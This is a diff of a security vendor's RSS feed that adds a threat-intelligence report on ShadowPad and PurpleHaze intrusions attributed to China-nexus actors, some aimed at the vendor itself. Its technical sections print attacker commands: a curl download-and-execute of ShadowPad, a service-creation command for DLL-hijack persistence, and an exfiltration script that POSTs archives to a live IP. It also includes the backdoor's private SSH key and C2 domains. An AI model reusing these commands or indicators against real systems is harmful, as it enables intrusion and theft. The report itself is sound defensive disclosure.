@@ -12,7 +12,7 @@
 	<atom:link href="https://www.sentinelone.com/labs/feed/" rel="self" type="application/rss+xml" />
 	<link>https://www.sentinelone.com/labs/</link>
 	<description>Next Generation Endpoint Security</description>
-	<lastBuildDate>Fri, 09 May 2025 11:23:45 +0000</lastBuildDate>
+	<lastBuildDate>Mon, 09 Jun 2025 08:11:37 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,408 @@
 	1	</sy:updateFrequency>
 	
 	<item>
+		<title>Follow the Smoke &#124; China-nexus Threat Actors Hammer At the Doors of Top Tier Targets</title>
+		<link>https://www.sentinelone.com/labs/follow-the-smoke-china-nexus-threat-actors-hammer-at-the-doors-of-top-tier-targets/</link>
+		
+		<dc:creator><![CDATA[Aleksandar Milenkoski &amp; Tom Hegel]]></dc:creator>
+		<pubDate>Mon, 09 Jun 2025 09:55:54 +0000</pubDate>
+				<category><![CDATA[adversary]]></category>
+		<category><![CDATA[China]]></category>
+		<guid isPermaLink="false">https://www.sentinelone.com/?post_type=labs&#038;p=122981</guid>
+
+					<description><![CDATA[This report uncovers a set of related threat clusters linked to PurpleHaze and ShadowPad operators targeting organizations, including cybersecurity vendors.]]></description>
+										<content:encoded><![CDATA[<h2>Executive Summary</h2>
+<ul>
+<li aria-level="1">In October 2024, SentinelLABS observed and countered a reconnaissance operation targeting SentinelOne, which we track as part of a broader activity cluster named PurpleHaze.</li>
+<li aria-level="1">At the beginning of 2025, we also identified and helped disrupt an intrusion linked to a wider ShadowPad operation. The affected organization was responsible for managing hardware logistics for SentinelOne employees at the time.</li>
+<li aria-level="1">A thorough investigation of SentinelOne&#8217;s infrastructure, software, and hardware assets confirmed that the attackers were unsuccessful and SentinelOne was not compromised by any of these activities.</li>
+<li aria-level="1">The PurpleHaze and ShadowPad activity clusters span multiple partially related intrusions into different targets occurring between July 2024 and March 2025. The victimology includes a South Asian government entity, a European media organization, and more than 70 organizations across a wide range of sectors.</li>
+<li aria-level="1">We attribute the PurpleHaze and ShadowPad activity clusters with high confidence to China-nexus threat actors. We loosely associate some PurpleHaze intrusions with actors that overlap with the suspected Chinese cyberespionage groups publicly reported as APT15 and UNC5174.</li>
+<li aria-level="1">This research underscores the persistent threat Chinese cyberespionage actors pose to global industries and public sector organizations, while also highlighting a rarely discussed target they pursue: cybersecurity vendors.</li>
+</ul>
+<h2>Overview</h2>
+<p>This research outlines threats that SentinelLABS observed and defended against in late 2024 and the first quarter of 2025. This post expands upon <a href="https://www.sentinelone.com/labs/top-tier-target-what-it-takes-to-defend-a-cybersecurity-company-from-todays-adversaries/" target="_blank" rel="noopener noreferrer">previous SentinelLABS research</a>, which provides an overview of threats against cybersecurity vendors, including SentinelOne, ranging from financially motivated crimeware to targeted attacks by nation-state actors. This research focuses specifically on the subset of threats targeting SentinelOne and others that we attribute to China-nexus threat actors.</p>
+<p>By disclosing details of the threat activities we have faced, we bring into focus an aspect of the threat landscape that has received limited attention in public cyber threat intelligence discourse: the targeting of cybersecurity vendors. Our objective is to contribute to strengthening industry defenses by promoting transparency and encouraging collaboration. Cybersecurity companies are high-value targets for threat actors due to their protective roles, deep visibility into client environments, and ability to disrupt adversary operations. The findings detailed in this post highlight the persistent interest of China-nexus actors in these organizations.</p>
+<p>This research focuses on the following activities targeting SentinelOne, as well as suspected related operations identified during our investigations:</p>
+<ul>
+<li aria-level="1">An intrusion into an IT services and logistics organization, which was responsible at the time for managing hardware logistics for SentinelOne employees.</li>
+<li aria-level="1">Extensive remote reconnaissance of SentinelOne servers intentionally reachable from the Internet by virtue of their functionality.</li>
+</ul>
+<p>We promptly informed the IT services and logistics organization of the intrusion details. A thorough investigation into SentinelOne&#8217;s infrastructure, software, and hardware assets found no evidence of compromise.</p>
+<p>At this point, it remains unclear whether the perpetrators&#8217; focus was solely on the targeted IT logistics organization or if they intended to extend their reach to downstream organizations as well. Nevertheless, this case underscores the persistent threat posed by suspected Chinese threat actors, who have a history of seeking to establish <a href="https://www.sentinelone.com/labs/operation-digital-eye-chinese-apt-compromises-critical-digital-infrastructure-via-visual-studio-code-tunnels/" target="_blank" rel="noopener noreferrer">strategic footholds</a> to potentially compromise downstream entities.</p>
+<p>As for the reconnaissance activity, we promptly identified and mapped the threat actor&#8217;s infrastructure involved in this operation as soon as it began. A thorough investigation of SentinelOne servers probed by the attackers revealed no signs of compromise. We assess with high confidence that the threat actor&#8217;s activities were limited to mapping and evaluating the availability of select Internet-facing servers, likely in preparation for potential future actions. Continuous monitoring of network traffic to our servers, which is part of established and continuing practice for protecting SentinelOne assets exposed to the Internet, enabled rapid detection and increased scrutiny to the reconnaissance activities, effectively mitigating any potential risks.</p>
+<p>Further investigations uncovered multiple, partially related intrusions and clusters of activity characteristic of modern Chinese-nexus operations:</p>
+<ul>
+<li aria-level="1">Activity A: June 2024 intrusion into a South Asian government entity</li>
+<li aria-level="1">Activity B: A set of intrusions impacting organizations worldwide occurring between July 2024 and March 2025</li>
+<li aria-level="1">Activity C: Intrusion into an IT services and logistics company at the beginning of 2025</li>
+<li aria-level="1">Activity D: October 2024 intrusion into the same government entity compromised in June 2024</li>
+<li aria-level="1">Activity E: October 2024 reconnaissance activity targeting SentinelOne</li>
+<li aria-level="1">Activity F: September 2024 intrusion into a leading European media organization</li>
+</ul>
+<p>The next two sections provide an overview of these activities, including timelines, points of overlap, and our attribution assessments, followed by concrete technical details, such as observed TTPs, malware, and infrastructure to enable other organizations in related sectors to investigate and mitigate similar sets of activity.</p>
+<h2>Overview | ShadowPad Intrusions</h2>
+<figure id="attachment_123751" aria-describedby="caption-attachment-123751" style="width: 1999px" class="wp-caption aligncenter"><img fetchpriority="high" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10.jpg" alt="ShadowPad activity, June 2024 - March 2025" width="1999" height="1278" class="size-full wp-image-123751" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10-300x192.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10-1024x655.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10-768x491.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_10-1536x982.jpg 1536w" sizes="(max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-123751" class="wp-caption-text">ShadowPad activity, June 2024 &#8211; March 2025</figcaption></figure>
+<p>In June 2024, SentinelLABS observed threat actor activity involving the ShadowPad malware targeting a South Asian government entity that provides IT solutions and infrastructure across multiple sectors (Activity A). The ShadowPad sample we retrieved was obfuscated using a variant of <a href="https://cloud.google.com/blog/topics/threat-intelligence/scatterbrain-unmasking-poisonplug-obfuscator" target="_blank" rel="noopener noreferrer">ScatterBrain</a>, an evolution of the <a href="https://www.pwc.co.uk/issues/cyber-security-services/insights/chasing-shadows.html" target="_blank" rel="noopener noreferrer">ScatterBee</a> obfuscation mechanism.</p>
+<p>Based on ShadowPad implementation characteristics, we identified additional samples that revealed broader activity taking place between July 2024 and March 2025, spanning a wide range of victims globally (Activity B). Using C2 netflow and SentinelOne telemetry data, SentinelLABS uncovered over 70 victims across sectors such as manufacturing, government, finance, telecommunications, and research. Potentially affected SentinelOne customers were proactively contacted by our Threat Discovery and Response (TDR) teams. One of the impacted entities was an IT services and logistics company, which had been responsible for managing hardware logistics for SentinelOne employees during that period (Activity C).</p>
+<p>We attribute these intrusions with high confidence to China-nexus actors, with ongoing efforts aimed at determining the specific threat clusters involved. <a href="https://www.sentinelone.com/labs/shadowpad-a-masterpiece-of-privately-sold-malware-in-chinese-espionage/" target="_blank" rel="noopener noreferrer">ShadowPad</a> is a closed-source modular backdoor platform used by multiple suspected China-nexus threat actors to conduct cyberespionage. Google Threat Intelligence Group <a href="https://cloud.google.com/blog/topics/threat-intelligence/scatterbrain-unmasking-poisonplug-obfuscator" target="_blank" rel="noopener noreferrer">has observed</a> the use of ScatterBrain-obfuscated ShadowPad samples since 2022 and attributes them to clusters associated with the suspected Chinese APT umbrella actor APT41.</p>
+<p>Several of the ShadowPad samples and infrastructure we identified have also been documented in previous public reporting on recent ShadowPad activities, including research published by <a href="https://www.trendmicro.com/en_us/research/25/b/updated-shadowpad-malware-leads-to-ransomware-deployment.html" target="_blank" rel="noopener noreferrer">TrendMicro</a>, <a href="https://www.orangecyberdefense.com/global/blog/cert-news/meet-nailaolocker-a-ransomware-distributed-in-europe-by-shadowpad-and-plugx-backdoors" target="_blank" rel="noopener noreferrer">Orange Cyberdefense</a>, and <a href="https://blog.checkpoint.com/security/check-point-research-explains-shadow-pad-nailaolocker-and-its-protection/" target="_blank" rel="noopener noreferrer">Check Point</a>. Some of these activities have included the deployment of ransomware referred to as NailaoLocker, though the motive remains unclear, whether for financial gain or as a <a href="https://www.sentinelone.com/labs/chamelgang-attacking-critical-infrastructure-with-ransomware/" target="_blank" rel="noopener noreferrer">means</a> of distraction, misattribution, or removal of evidence.</p>
+<h2>Overview | The PurpleHaze Activity Cluster</h2>
+<figure id="attachment_123743" aria-describedby="caption-attachment-123743" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_5.jpg" alt="PurpleHaze activity, September - October 2024" width="1999" height="1278" class="size-full wp-image-123743" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_5.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_5-300x192.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_5-1024x655.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_5-768x491.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_5-1536x982.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-123743" class="wp-caption-text">PurpleHaze activity, September &#8211; October 2024</figcaption></figure>
+<p>In early October 2024, SentinelLABS observed new threat actor activity (Activity D) at the same South Asian government entity compromised using ShadowPad in June 2024 (Activity A).</p>
+<p>This intrusion involved backdoors that we classify as part of a malware cluster designated GOREshell, our designation for a loose malware cluster that includes the open-source <a href="https://github.com/NHAS/reverse_ssh" target="_blank" rel="noopener noreferrer">reverse_ssh</a> backdoor and its custom variants, which we have observed in targeted attacks. While these variants exhibit variations in implementation, all share code similarities with the client component of <code>reverse_ssh</code>.</p>
+<p>We track some of the infrastructure used in this intrusion as part of an operational relay box (ORB) network used by several suspected Chinese cyberespionage actors, particularly a threat group that overlaps with public reporting on APT15. The use of ORB networks is a <a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks/" target="_blank" rel="noopener noreferrer">growing</a> trend among Chinese threat groups, since they can be rapidly expanded to create a dynamic and evolving infrastructure that makes tracking cyberespionage operations and their attribution challenging. APT15, also historically referred to as Ke3Chang and Nylon Typhoon, is a suspected Chinese cyberespionage actor known for its global targeting of critical sectors, including telecommunications, information technology, and government organizations.</p>
+<p>Further, in October 2024, the same month as the activity targeting the South Asian government entity, SentinelLABS observed remote connections to Internet-facing SentinelOne servers for reconnaissance (Activity E). Based on significant overlaps in infrastructure management, as well as domain creation and naming practices, we associate with high confidence the infrastructure observed in the reconnaissance operation with that used by the threat actor targeting the South Asian government entity (Activity D). This suggests the involvement of the same threat actor, or of a third-party entity responsible for managing infrastructure for multiple threat groups, a common practice in the Chinese cyberespionage landscape.</p>
+<p>In late September 2024, a few weeks before the October activities, SentinelLABS observed an intrusion into a leading European media organization (Activity F). Our investigation revealed overlaps in the tools used during this intrusion and the October 2024 activity targeting the South Asian government entity (Activity D). This includes the GOREshell backdoor and publicly available tools developed by <a href="https://www.thc.org/" target="_blank" rel="noopener noreferrer">The Hacker&#8217;s Choice</a> (THC), a community of cybersecurity researchers.</p>
+<p>Activity D and Activity F are the first instances in which we have observed THC tooling used in the context of APT activities.</p>
+<p>We attribute Activity F with high confidence to a China-nexus actor, loosely associating it with a suspected Chinese initial access broker <a href="https://cloud.google.com/blog/topics/threat-intelligence/initial-access-brokers-exploit-f5-screenconnect" target="_blank" rel="noopener noreferrer">tracked</a> as UNC5174 by Mandiant. We acknowledge the possibility that post-intrusion activities may have been conducted by a different threat group.</p>
+<p>The threat actor leveraged ORB network infrastructure, which we assess to be operated from China, and exploited the <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8963" target="_blank" rel="noopener noreferrer">CVE-2024-8963</a> vulnerability together with <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-8190" target="_blank" rel="noopener noreferrer">CVE-2024-8190</a> to establish an initial foothold, a few days before the vulnerabilities were publicly disclosed. This intrusion method suggests the involvement of UNC5174, which is <a href="https://cloud.google.com/blog/topics/threat-intelligence/initial-access-brokers-exploit-f5-screenconnect" target="_blank" rel="noopener noreferrer">assessed</a> to be a contractor for China&#8217;s Ministry of State Security (MSS) primarily focusing on gaining access and specializing in exploiting vulnerabilities in targeted systems. After compromising these systems, UNC5174 is suspected of transferring access to other threat actors.</p>
+<p>In January 2025, CISA and the FBI released a <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-022a" target="_blank" rel="noopener noreferrer">joint advisory</a> reporting threat actor activities that also took place in September 2024, involving the chained exploitation of CVE-2024-8963 and CVE-2024-8190, without providing specific attribution assessments. In March 2025, the French Cybersecurity Agency (ANSSI) released its <a href="https://cyber.gouv.fr/en/publications/cyber-threat-overview-2024" target="_blank" rel="noopener noreferrer">2024 cyber threat overview</a> report, which documents intrusions that occurred in September 2024, involved the same vulnerabilities, and show overlaps in TTPs associated with UNC5174.</p>
+<p>Additionally, Mandiant has <a href="https://cloud.google.com/blog/topics/threat-intelligence/initial-access-brokers-exploit-f5-screenconnect" target="_blank" rel="noopener noreferrer">observed</a> UNC5174 exploiting the <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46747" target="_blank" rel="noopener noreferrer">CVE-2023-46747</a> and <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-1709" target="_blank" rel="noopener noreferrer">CVE-2024-1709</a> vulnerabilities and deploying a publicly available backdoor tracked as GOREVERSE. Strings and code segments in the public GOREVERSE YARA rule provided by Mandiant match the <code>reverse_ssh</code> backdoor, placing GOREVERSE in the GOREshell malware cluster, samples of which we observed in both this intrusion and the October 2024 activity targeting the South Asian government entity.</p>
+<p>We collectively track Activity D, E and F as the PurpleHaze threat cluster. While we attribute PurpleHaze with high confidence to China-nexus threat actors, investigations continue to determine the specific threat groups behind the activities and their potential links to the June 2024 and later ShadowPad intrusions (Activity A, B, and C).</p>
+<p>We do not rule out the involvement of distinct threat groups or the possibility of multiple intrusions conducted by the same threat actor, especially given the widespread use of publicly available tools and the extensive sharing of malware, infrastructure, and operational practices among Chinese threat groups. We also consider the possibility that access may have been transferred between different actors, particularly in light of the suspected involvement of UNC5174.</p>
+<h2>Technical Details | ShadowPad Intrusions</h2>
+<p>We present below technical details on the ShadowPad intrusion into the South Asian government entity in June 2024 (Activity A), as well as on the broader ShadowPad activities that took place between July 2024 and March 2025 (Activity B and C).</p>
+<h3>Activity A | ShadowPad and ScatterBrain Obfuscation</h3>
+<p>This intrusion involved the deployment of a ShadowPad sample named <code>AppSov.exe</code>. The threat actor deployed <code>AppSov.exe</code> by executing a PowerShell command that performs the following actions:</p>
+<ul>
+<li aria-level="1">Downloads a file named <code>x.dat</code> from a remote endpoint using <code>curl.exe</code> after a 60-second delay.</li>
+<li aria-level="1">Saves the downloaded file as <code>AppSov.exe</code> in the <code>C:\ProgramData\</code> directory.</li>
+<li aria-level="1">Launches the executable using the <code>Start-Process</code> PowerShell command.</li>
+<li aria-level="1">Reboots the system after a delay of 30 minutes.</li>
+</ul>
+<pre>
+sleep 60;curl.exe -o c:\programdata\AppSov.EXE http://[REDACTED]/dompdf/x.dat;start-process c:\programdata\AppSov.EXE;sleep 1800;shutdown.exe -r -t 1 -f;
+</pre>
+<p>The endpoint hosting <code>x.dat</code> was a previously compromised system within the same organization. Our analysis revealed that malware artifacts had been deployed on this system approximately one month prior to the ShadowPad deployment. These include the agent component of the <a href="https://github.com/itaymigdal/Nimbo-C2" target="_blank" rel="noopener noreferrer">Nimbo-C2</a> open-source remote access framework, as well as a PowerShell script that performs the following actions:</p>
+<ul>
+<li aria-level="1">Collects sensitive user data (documents, credentials, and cryptographic material) by recursively searching <code>C:\Users\</code> for files modified in the previous 600 days and with the following extensions: <code>*.xls</code>, <code>*.xlsx</code>, <code>*.ods</code>, <code>*.txt</code>, <code>*.pem</code>, <code>*.cert</code>, and <code>*.pfx</code>.</li>
+<li aria-level="1">Copies the collected files to a temporary folder at <code>C:\windows\vss\temp</code>.</li>
+<li aria-level="1">Archives the collected files into an archive file named with the system’s MAC address and date, likely for tracking compromised endpoints.</li>
+<li aria-level="1">Encrypts and password-protects the archive using <a href="https://www.7-zip.org/" target="_blank" rel="noopener noreferrer">7-Zip</a> with the password <code>@WsxCFt6&amp;UJMmko0</code>, ensuring the data is obfuscated from inspection.</li>
+<li aria-level="1">Exfiltrates the encrypted archive via a <code>curl</code> POST request to a hardcoded URL: <code>https[://]45.13.199[.]209/rss/rss.php</code>.</li>
+<li aria-level="1">Removes traces by deleting the temporary folder, archive, and DAT files after exfiltration to avoid detection and forensic recovery.</li>
+</ul>
+<figure id="attachment_123747" aria-describedby="caption-attachment-123747" style="width: 778px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_14.jpg" alt="PowerShell exfiltration script" width="778" height="318" class="size-full wp-image-123747" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_14.jpg 778w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_14-300x123.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_14-768x314.jpg 768w" sizes="auto, (max-width: 778px) 100vw, 778px" /><figcaption id="caption-attachment-123747" class="wp-caption-text">PowerShell exfiltration script</figcaption></figure>
+<p>The Nimbo-C2 agent was deployed to <code>C:\ProgramData\Prefetch\PfSvc.exe</code>, likely masquerading as a Privacyware Privatefirewall executable.</p>
+<p>We have not previously observed the use of Nimbo-C2 or variants of the PowerShell exfiltration script in the context of suspected Chinese APT activity. <a href="https://medium.com/@knownsec404team/apt-k-47-organization-launches-espionage-attacks-using-a-new-trojan-tool-5e7eccfdce2f" target="_blank" rel="noopener noreferrer">Previous research</a> has documented the use of Nimbo-C2 in operations attributed to APT-K-47 (also known as Mysterious Elephant), a threat actor believed to originate from South Asia.</p>
+<p>The deployment of the ShadowPad sample <code>AppSov.exe</code> raises several possibilities:</p>
+<ul>
+<li aria-level="1">the same threat actor conducted both the earlier activity and the ShadowPad deployment,</li>
+<li aria-level="1">access was handed off to, or leveraged by, a second actor, or</li>
+<li aria-level="1">two distinct actors operated independently within the same environment.</li>
+</ul>
+<p><code>AppSov.exe</code> was obfuscated using a variant of ScatterBrain. The malware uses the domain <code>news.imaginerjp[.]com</code> and the IP address <code>65.38.120[.]110</code> for C2 communication, leveraging DNS over HTTPS (DoH) in an attempt to evade detection by Base-64 encoding queried domains and obscuring DNS traffic from monitoring systems.</p>
+<pre>
+https[://]8.8.8.8//dns-query?dns=AAABAAABAAAAAAAABG5ld3MKaW1hZ2luZXJqcANjb20AAAEAAQ
+</pre>
+<p><code>AppSov.exe</code> is obfuscated using dispatcher routines that alter control flow, displacements placed after each invocation of these routines, and opaque predicates. The malware verifies its integrity using the constant values <code>0x89D17427</code>, <code>0x254733D6</code>, <code>0x6FE2CF4E</code>, and <code>0x110302D6</code>. It is distributed with three modules: one with the ID <code>0x0A</code> and two with the ID <code>0x20</code>. The ShadowPad module IDs designate different types of modules, including configuration data or code that implements malware functionalities such as injection or data theft.</p>
+<p><figure id="attachment_123819" aria-describedby="caption-attachment-123819" style="width: 628px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_4x.jpg" alt="AppSov.exe: ShadowPad module IDs and sizes" width="628" height="502" class="size-full wp-image-123819" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_4x.jpg 628w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_4x-300x240.jpg 300w" sizes="auto, (max-width: 628px) 100vw, 628px" /><figcaption id="caption-attachment-123819" class="wp-caption-text"><em>AppSov.exe</em>: ShadowPad module IDs and sizes</figcaption></figure><br />
+<figure id="attachment_123820" aria-describedby="caption-attachment-123820" style="width: 616px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_7x.jpg" alt="AppSov.exe: Deobfuscated dispatcher routine" width="616" height="346" class="size-full wp-image-123820" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_7x.jpg 616w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_7x-300x169.jpg 300w" sizes="auto, (max-width: 616px) 100vw, 616px" /><figcaption id="caption-attachment-123820" class="wp-caption-text"><em>AppSov.exe</em>: Deobfuscated dispatcher routine</figcaption></figure></p>
+<p>For a detailed overview of the ScatterBrain obfuscation mechanism and additional ShadowPad implementation details, we refer to <a href="https://cloud.google.com/blog/topics/threat-intelligence/scatterbrain-unmasking-poisonplug-obfuscator" target="_blank" rel="noopener noreferrer">previous research</a> by Google Threat Intelligence Group.</p>
+<h3>Activity B &amp; C | A Global ShadowPad Operation</h3>
+<p>Based on various implementation overlaps with <code>AppSov.exe</code>, including configuration data as well as custom decryption and integrity verification constant values, we identified multiple additional ShadowPad samples obfuscated using ScatterBee variants. This also led to the discovery of related infrastructure, including the ShadowPad C2 servers <code>dscriy.chtq[.]net</code> and <code>updata.dsqurey[.]com</code>, as well as the suspected ShadowPad-related domains <code>network.oossafe[.]com</code> and <code>notes.oossafe[.]com</code>.</p>
+<p><figure id="attachment_123746" aria-describedby="caption-attachment-123746" style="width: 507px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_2.jpg" alt="Deobfuscated integrity verification routine in AppSov.exe" width="507" height="260" class="size-full wp-image-123746" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_2.jpg 507w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_2-300x154.jpg 300w" sizes="auto, (max-width: 507px) 100vw, 507px" /><figcaption id="caption-attachment-123746" class="wp-caption-text">Deobfuscated integrity verification routine in <em>AppSov.exe</em></figcaption></figure><br />
+<figure id="attachment_123745" aria-describedby="caption-attachment-123745" style="width: 604px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_3.jpg" alt="Deobfuscated integrity verification routine in another ShadowPad sample" width="604" height="335" class="size-full wp-image-123745" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_3.jpg 604w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_3-300x166.jpg 300w" sizes="auto, (max-width: 604px) 100vw, 604px" /><figcaption id="caption-attachment-123745" class="wp-caption-text">Deobfuscated integrity verification routine in another ShadowPad sample</figcaption></figure></p>
+<p>Some of the samples we identified differ in execution from <code>AppSov.exe</code>. Instead of embedding the full ShadowPad functionality and configuration within a single executable, they are implemented as Windows DLLs designed to be loaded by specific legitimate executables vulnerable to DLL hijacking. These DLLs then load an external file with an eight-character name and the <code>.tmp</code> extension, for example <code>1D017DF2.tmp</code>.</p>
+<p>Using C2 netflow and SentinelOne telemetry data, we identified a broad range of victim organizations compromised by the ShadowPad samples we discovered. Between July 2024 and March 2025, this malware was involved in intrusions at over 70 organizations across multiple regions globally, spanning sectors such as manufacturing, government, finance, telecommunications, and research. Among the victims was the IT services and logistics company that was managing hardware logistics for SentinelOne employees at the time (Activity C).</p>
+<figure id="attachment_123742" aria-describedby="caption-attachment-123742" style="width: 1999px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_6.jpg" alt="Geographical distribution of victims" width="1999" height="1278" class="size-full wp-image-123742" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_6.jpg 1999w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_6-300x192.jpg 300w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_6-1024x655.jpg 1024w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_6-768x491.jpg 768w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_6-1536x982.jpg 1536w" sizes="auto, (max-width: 1999px) 100vw, 1999px" /><figcaption id="caption-attachment-123742" class="wp-caption-text">Geographical distribution of victims</figcaption></figure>
+<p>We suspect that the most common initial access vector involved the exploitation of Check Point gateway devices, consistent with <a href="https://www.orangecyberdefense.com/global/blog/cert-news/meet-nailaolocker-a-ransomware-distributed-in-europe-by-shadowpad-and-plugx-backdoors" target="_blank" rel="noopener noreferrer">previous research</a> on this topic. We also observed communication to ShadowPad C2 servers originating from Fortinet Fortigate, Microsoft IIS, SonicWall, and CrushFTP servers, suggesting potential exploitation of these systems as well.</p>
+<h2>Technical Details | PurpleHaze</h2>
+<p>We present below technical details on intrusions that are part of the PurpleHaze threat cluster: the intrusion into the South Asian government entity in October 2024 (Activity D, the same organization compromised using ShadowPad in June 2024), the reconnaissance of SentinelOne infrastructure in October 2024 (Activity E), and the intrusion into the European media organization in September 2024 (Activity F).</p>
+<h3>Activity D | GOREshell &amp; a China-based ORB Network</h3>
+<p>In early October 2024, we detected system reconnaissance and malware deployment activities on a workstation within the South Asian government entity. The threat actor executed the <code>ipconfig</code> Windows command to query network configuration and established a connection to IP address <code>103.248.61[.]36</code> on port 443. The adversary then created the <code>C:\Program Files\VMware\VGAuth</code> directory and downloaded an archive file named <code>VGAuth1.zip</code> from <code>103.248.61[.]36</code>; after extracting its contents into the <code>VGAuth</code> directory, the archive was deleted.</p>
+<p>The archive file contained two executables: a legitimate <code>VGAuthService.exe</code> executable and a malicious DLL file named <code>glib-2.0.dll</code> (original filename: <code>libglib-2.0-0.dll</code>), which masquerades as a legitimate <a href="https://docs.gtk.org/glib/" target="_blank" rel="noopener noreferrer">GLib–2.0</a> library file.</p>
+<p><code>VGAuthService.exe</code> implements the VMware Guest Authentication Service. The threat actor deployed version <code>11.3.5.59284</code>, signed by VMWare and compiled on Tuesday, August 31, 2021, 06:14:07 UTC. This version is vulnerable to DLL hijacking.</p>
+<p>The threat actor then created a new Windows service named <code>VGAuthService</code>, which automatically starts upon system boot, runs the <code>VGAuthService.exe</code> executable, and displays as <code>Alias Manager and Ticket Service</code>. When the service was started, <code>VGAuthService.exe</code> loaded and executed the malicious <code>glib-2.0.dll</code> library file.</p>
+<pre>
+sc create VGAuthService binPath= "\"C:\\Program Files\\VMware\\\VGAuth\\VGAuthService.exe\"" start=auto error=ignore displayname="Alias Manager and Ticket Service"
+</pre>
+<p><code>glib-2.0.dll</code> implements the GOREshell backdoor, which uses <code>reverse_ssh</code> functionalities to establish SSH connections to attacker-controlled endpoints. The backdoor is implemented in the Go programming language and obfuscated using <a href="https://github.com/burrowers/garble" target="_blank" rel="noopener noreferrer">Garble</a>, including string literals, package paths, and function names. It uses the <a href="https://pkg.go.dev/cmd/cgo" target="_blank" rel="noopener noreferrer">cgo</a> library to invoke C code.</p>
+<figure id="attachment_123750" aria-describedby="caption-attachment-123750" style="width: 437px" class="wp-caption aligncenter"><img loading="lazy" decoding="async" src="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_11.jpg" alt="glib-2.0.dll: Obfuscated form of the string Fail to detect service: %v" width="437" height="214" class="size-full wp-image-123750" srcset="https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_11.jpg 437w, https://www.sentinelone.com/wp-content/uploads/2025/06/China_TopTier_11-300x147.jpg 300w" sizes="auto, (max-width: 437px) 100vw, 437px" /><figcaption id="caption-attachment-123750" class="wp-caption-text"><em>glib-2.0.dll</em>: Obfuscated form of the string <em>Fail to detect service: %v</em></figcaption></figure>
+<p><code>glib-2.0.dll</code> contains a private SSH key used for establishing SSH connections to the threat actor’s C2 server.</p>
+<pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACABqioIxWKMLg7cKJuRt30HFKJuyTBVP7F6c6G7ozrcdwAAAIgRVxQaEVcUGgAAAAtzc2gtZWQyNTUxOQAAACABqioIxWKMLg7cKJuRt30HFKJuyTBVP7F6c6G7ozrcdwAAAECLzCu1ax/sxC6Vvt8/pkE+H2ryf9RtRqsyjs/1cL5k3QGqKgjFYowuDtwom5G3fQcUom7JMFU/sXpzobujOtx3AAAAAAECAwQF
+-----END OPENSSH PRIVATE KEY-----
+</pre>
+<p>The malware was configured to use <code>downloads.trendav[.]vip</code> for C2 purposes. This domain resolved to <code>142.93.214[.]219</code> at the time of the activity. <code>glib-2.0.dll</code> establishes SSH connections over the Websocket protocol (<code>wss[://]downloads.trendav[.]vip:443</code>).</p>
